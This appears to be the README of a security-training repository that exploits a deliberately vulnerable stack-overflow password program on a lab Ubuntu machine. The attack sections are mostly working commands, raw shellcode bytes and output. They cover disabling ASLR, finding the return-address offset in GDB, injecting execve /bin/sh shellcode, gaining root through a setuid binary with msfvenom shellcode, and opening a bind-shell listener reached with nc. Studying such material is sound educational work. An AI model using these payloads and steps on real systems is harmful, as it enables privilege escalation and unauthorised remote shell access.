# Usage

## Prerequesties
### Build parameters
```bash
$ g++ -fno-stack-protector -z execstack stack_overflow.cpp -o stack_overflow
```

### Disable ASLR
```bash
$ echo 0 > /proc/sys/kernel/randomize_va_space
```

### Tools
- cmake
- gcc/clang
- GDB Peda (https://github.com/longld/peda)
- metasploit
- Tested on Ubuntu 22.04

## Normal usage
```bash
$ ./stack_overflow

Enter a password: 123
FAILED
Entered password: 123
Required password: 1111111111
```

## Deny of service
```python
$ python3 -c "print('A'*100)" | ./stack_overflow

Enter a password: FAILED
Entered password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Required password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

## Changing program behavior
```python
$ python3 -c "print('A'*9 + '\x00' + 'A'*9)" | ./stack_overflow

Enter a password: SUCCESS
Entered password: AAAAAAAAA
Required password: AAAAAAAAA
```

## Arbitrary code execution

```python
$ gdb stack_overflow

gdb-peda$ pattern_create 200 pattern.in
Writing pattern of 200 chars to filename "pattern.in"

gdb-peda$ r < pattern.in 
Starting program: /home/talantov/projects/appsec/exploit/build/stack_overflow < pattern.in
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter a password: FAILED
Entered password: AAA%AAsAABAA$AAnAACAA�
Required password: AA$AAnAACAA�

Program received signal SIGSEGV, Segmentation fault.
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.


[----------------------------------registers-----------------------------------]
RAX: 0x555555558040 --> 0x7ffff7e23370 --> 0x7ffff7d3b5f0 (<_ZNSoD1Ev>:	endbr64)
RBX: 0x0 
RCX: 0xc00 ('')
RDX: 0x7ffff7e23370 --> 0x7ffff7d3b5f0 (<_ZNSoD1Ev>:	endbr64)
RSI: 0x0 
RDI: 0x7ffff7a1ba70 --> 0x0 
RBP: 0x3241416341414741 ('AGAAcAA2')
RSP: 0x7fffffffde48 ("AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x555555555388 (<_Z4authv+383>:	ret)
R8 : 0xc ('\x0c')
R9 : 0x55555556b2c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
R10: 0x7ffff780d560 --> 0xf002200006490 
R11: 0x246 
R12: 0x7fffffffdf78 --> 0x7fffffffe2cc ("/home/talantov/projects/appsec/exploit/build/stack_overflow")
R13: 0x555555555389 (<main(int, char**)>:	endbr64)
R14: 0x555555557d70 --> 0x5555555551c0 (<__do_global_dtors_aux>:	endbr64)
R15: 0x7ffff7ffd040 --> 0x7ffff7ffe2e0 --> 0x555555554000 --> 0x10102464c457f
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555555381 <_Z4authv+376>:	call   0x5555555550f0 <_ZNSolsEPFRSoS_E@plt>
   0x555555555386 <_Z4authv+381>:	nop
   0x555555555387 <_Z4authv+382>:	leave  
=> 0x555555555388 <_Z4authv+383>:	ret    
   0x555555555389 <main(int, char**)>:	endbr64 
   0x55555555538d <main(int, char**)+4>:	push   rbp
   0x55555555538e <main(int, char**)+5>:	mov    rbp,rsp
   0x555555555391 <main(int, char**)+8>:	sub    rsp,0x10
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde48 ("AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0x7fffffffde50 ("3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0x7fffffffde58 ("A4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7fffffffde60 ("AA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| 0x7fffffffde68 ("gAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| 0x7fffffffde70 ("AhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0048| 0x7fffffffde78 ("AAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0056| 0x7fffffffde80 ("NAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000555555555388 in auth () at /home/talantov/projects/appsec/exploit/stack_overflow.cpp:20
20	}

gdb-peda$ pattern_offset AAHAAdAA3AAIAAeAA4
AAHAAdAA3AAIAAeAA4 found at offset: 61
```

```bash
$ export PWN=`python3 -c 'import sys; sys.stdout.buffer.write(b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")'`

$ ./getenvvar PWN ./stack_oveflow
PWN will be at 0x7fffffffe53f
```

Offset 61 points to return address position. Address **0x7fffffffe53f** points to shellcode position.
```bash
$ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*61 + b'\x3f\xe5\xff\xff\xff\x7f\x00\x00' + b'\n')"; cat) | ./stack_overflow

Enter a password: FAILED
Entered password: AAAAAAAAAAAAAAAAAAAAAC
Required password: AAAAAAAAAAAC
id
uid=1000(talantov) gid=1000(talantov) groups=1000(talantov),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
uname -a
Linux talantov-virtual-machine 6.2.0-32-generic #32~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 18 10:40:13 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

## Privilege escalation

1. Gain shellcode with setuid(0), using msfvenom from metasploit
   
```bash
$ msfvenom -p linux/x64/exec -f c CMD=/bin/sh PrependSetuid=True NullFreeVersion=True

Payload size: 63 bytes
Final size of c file: 291 bytes
unsigned char buf[] = 
"\x48\x31\xff\x6a\x69\x58\x0f\x05\x48\xb8\x2f\x2f\x62\x69"
"\x6e\x2f\x73\x68\x99\xeb\x1e\x5d\x52\x5b\xb3\x07\x88\x14"
"\x2b\x52\x66\x68\x2d\x63\x54\x5e\x52\x50\x54\x5f\x52\x55"
"\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05\xe8\xdd\xff\xff\xff"
"\x2f\x62\x69\x6e\x2f\x73\x68";
```

2. Change owner of stack_overflow binary, and set setuid bit
```bash
$ sudo chown root.root stack_overflow
$ sudo chmod u+s stack_overflow
```

3. Update PWN vairable with new shellcode
```bash
$ export PWN=`python3 -c 'import sys; sys.stdout.buffer.write(b"\x48\x31\xff\x6a\x69\x58\x0f\x05\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x99\xeb\x1e\x5d\x52\x5b\xb3\x07\x88\x14\x2b\x52\x66\x68\x2d\x63\x54\x5e\x52\x50\x54\x5f\x52\x55\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")'`
```

4. Execute exploit once again
```python
$ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*61 + b'\x3f\xe5\xff\xff\xff\x7f\x00\x00' + b'\n')"; cat) | ./stack_overflow
```

5. Now you are root
```
Enter a password: FAILED
Entered password: AAAAAAAAAAAAAAAAAAAAAC
Required password: AAAAAAAAAAAC
id
uid=0(root) gid=1000(talantov) groups=1000(talantov),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
whoami
root
```

## Remote code execution
1. Gain shellcode for TCP server, using msfvenom from metasploit

```bash
$ msfvenom -p linux/x64/shell_bind_tcp_random_port -f c PrependSetuid=True

Payload size: 59 bytes
Final size of c file: 275 bytes
unsigned char buf[] = 
"\x48\x31\xff\x6a\x69\x58\x0f\x05\x6a\x29\x58\x99\x6a\x01"
"\x5e\x6a\x02\x5f\x0f\x05\x97\xb0\x32\x0f\x05\x96\xb0\x2b"
"\x0f\x05\x97\x96\xff\xce\x6a\x21\x58\x0f\x05\x75\xf7\x52"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0"
"\x3b\x0f\x05";
```

Equivalent TCP-server program:

```c
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    listen(sockfd, 1);
    int clientfd = accept(sockfd, NULL, NULL);
    dup2(clientfd, 0);
    dup2(clientfd, 1);
    dup2(clientfd, 2);
    char * const argv[] = {"sh",NULL, NULL};
    execve("/bin/sh", argv, NULL);
    return 0;
}
```

2. Update PWN vairable with new shellcode
```bash
$ export PWN=`python3 -c 'import sys; sys.stdout.buffer.write(b"\x48\x31\xff\x6a\x69\x58\x0f\x05\x6a\x29\x58\x99\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x97\xb0\x32\x0f\x05\x96\xb0\x2b\x0f\x05\x97\x96\xff\xce\x6a\x21\x58\x0f\x05\x75\xf7\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05")'`
```

3. Execute exploit once again
```python
$ (python3 -c "import sys; sys.stdout.buffer.write(b'A'*61 + b'\x3f\xe5\xff\xff\xff\x7f\x00\x00' + b'\n')"; cat) | ./stack_overflow
```

4. Check open ports in other console:
```bash
$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5433          0.0.0.0:*               LISTEN      5750/postgres       
tcp        0      0 0.0.0.0:55709           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                
```

5. Connect to opened port 55709 and execute arbitrary commands

```bash
$ nc localhost 55709
id
uid=0(root) gid=1000(talantov) groups=1000(talantov),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
whoami
root
```

## Useful commands
Memory segments with their rights for executed process pmap <pid>:
```bash
$ pmap 43751
43751:   ./stack_overflow
0000555555554000      4K r---- stack_overflow
0000555555555000      4K r-x-- stack_overflow
0000555555556000      4K r---- stack_overflow
0000555555557000      4K r---- stack_overflow
0000555555558000      4K rw--- stack_overflow
0000555555559000    132K rw---   [ anon ]
00007ffff7800000    160K r---- libc.so.6
00007ffff7828000   1620K r-x-- libc.so.6
00007ffff79bd000    352K r---- libc.so.6
00007ffff7a15000     16K r---- libc.so.6
00007ffff7a19000      8K rw--- libc.so.6
00007ffff7a1b000     52K rw---   [ anon ]
00007ffff7c00000    616K r---- libstdc++.so.6.0.30
00007ffff7c9a000   1092K r-x-- libstdc++.so.6.0.30
00007ffff7dab000    444K r---- libstdc++.so.6.0.30
00007ffff7e1a000      4K ----- libstdc++.so.6.0.30
00007ffff7e1b000     44K r---- libstdc++.so.6.0.30
00007ffff7e26000     12K rw--- libstdc++.so.6.0.30
00007ffff7e29000     12K rw---   [ anon ]
00007ffff7e9d000     16K rw---   [ anon ]
00007ffff7ea1000     12K r---- libgcc_s.so.1
00007ffff7ea4000     92K r-x-- libgcc_s.so.1
00007ffff7ebb000     16K r---- libgcc_s.so.1
00007ffff7ebf000      4K r---- libgcc_s.so.1
00007ffff7ec0000      4K rw--- libgcc_s.so.1
00007ffff7ec1000     56K r---- libm.so.6
00007ffff7ecf000    496K r-x-- libm.so.6
00007ffff7f4b000    364K r---- libm.so.6
00007ffff7fa6000      4K r---- libm.so.6
00007ffff7fa7000      4K rw--- libm.so.6
00007ffff7fbb000      8K rw---   [ anon ]
00007ffff7fbd000     16K r----   [ anon ]
00007ffff7fc1000      8K r-x--   [ anon ]
00007ffff7fc3000      8K r---- ld-linux-x86-64.so.2
00007ffff7fc5000    168K r-x-- ld-linux-x86-64.so.2
00007ffff7fef000     44K r---- ld-linux-x86-64.so.2
00007ffff7ffb000      8K r---- ld-linux-x86-64.so.2
00007ffff7ffd000      8K rw--- ld-linux-x86-64.so.2
00007ffffffde000    132K rwx--   [ stack ]
ffffffffff600000      4K --x--   [ anon ]
 total             6056K

```
The same via proc maps:
```bash
$ cat /proc/43751/maps
555555554000-555555555000 r--p 00000000 08:03 299005                     /home/talantov/projects/appsec/exploit/build/stack_overflow
555555555000-555555556000 r-xp 00001000 08:03 299005                     /home/talantov/projects/appsec/exploit/build/stack_overflow
555555556000-555555557000 r--p 00002000 08:03 299005                     /home/talantov/projects/appsec/exploit/build/stack_overflow
555555557000-555555558000 r--p 00002000 08:03 299005                     /home/talantov/projects/appsec/exploit/build/stack_overflow
555555558000-555555559000 rw-p 00003000 08:03 299005                     /home/talantov/projects/appsec/exploit/build/stack_overflow
555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]
7ffff7800000-7ffff7828000 r--p 00000000 08:03 3696787                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7828000-7ffff79bd000 r-xp 00028000 08:03 3696787                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff79bd000-7ffff7a15000 r--p 001bd000 08:03 3696787                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7a15000-7ffff7a19000 r--p 00214000 08:03 3696787                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7a19000-7ffff7a1b000 rw-p 00218000 08:03 3696787                    /usr/lib/x86_64-linux-gnu/libc.so.6
7ffff7a1b000-7ffff7a28000 rw-p 00000000 00:00 0 
7ffff7c00000-7ffff7c9a000 r--p 00000000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7c9a000-7ffff7dab000 r-xp 0009a000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7dab000-7ffff7e1a000 r--p 001ab000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7e1a000-7ffff7e1b000 ---p 0021a000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7e1b000-7ffff7e26000 r--p 0021a000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7e26000-7ffff7e29000 rw-p 00225000 08:03 3690467                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
7ffff7e29000-7ffff7e2c000 rw-p 00000000 00:00 0 
7ffff7e9d000-7ffff7ea1000 rw-p 00000000 00:00 0 
7ffff7ea1000-7ffff7ea4000 r--p 00000000 08:03 3677686                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7ea4000-7ffff7ebb000 r-xp 00003000 08:03 3677686                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7ebb000-7ffff7ebf000 r--p 0001a000 08:03 3677686                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7ebf000-7ffff7ec0000 r--p 0001d000 08:03 3677686                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7ec0000-7ffff7ec1000 rw-p 0001e000 08:03 3677686                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7ec1000-7ffff7ecf000 r--p 00000000 08:03 3697436                    /usr/lib/x86_64-linux-gnu/libm.so.6
7ffff7ecf000-7ffff7f4b000 r-xp 0000e000 08:03 3697436                    /usr/lib/x86_64-linux-gnu/libm.so.6
7ffff7f4b000-7ffff7fa6000 r--p 0008a000 08:03 3697436                    /usr/lib/x86_64-linux-gnu/libm.so.6
7ffff7fa6000-7ffff7fa7000 r--p 000e4000 08:03 3697436                    /usr/lib/x86_64-linux-gnu/libm.so.6
7ffff7fa7000-7ffff7fa8000 rw-p 000e5000 08:03 3697436                    /usr/lib/x86_64-linux-gnu/libm.so.6
7ffff7fbb000-7ffff7fbd000 rw-p 00000000 00:00 0 
7ffff7fbd000-7ffff7fc1000 r--p 00000000 00:00 0                          [vvar]
7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00:00 0                          [vdso]
7ffff7fc3000-7ffff7fc5000 r--p 00000000 08:03 3696447                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7fc5000-7ffff7fef000 r-xp 00002000 08:03 3696447                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7fef000-7ffff7ffa000 r--p 0002c000 08:03 3696447                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7ffb000-7ffff7ffd000 r--p 00037000 08:03 3696447                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffff7ffd000-7ffff7fff000 rw-p 00039000 08:03 3696447                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7ffffffde000-7ffffffff000 rwxp 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

Output hexidecimal file content:
```bash
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*61 + b'\x0e\xe5\xff\xff\xff\x7f\x00\x00' + b'\n')" > exploit.in
$ hexdump exploit.in 

0000000 4141 4141 4141 4141 4141 4141 4141 4141
*
0000030 4141 4141 4141 4141 4141 4141 0e41 ffe5
0000040 ffff 007f 0a00                         
0000046

```

## Useful links
- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow
- https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
- https://medium.com/csg-govtech/why-doesnt-my-shellcode-work-anymore-136ce179643f
- https://shell-storm.org/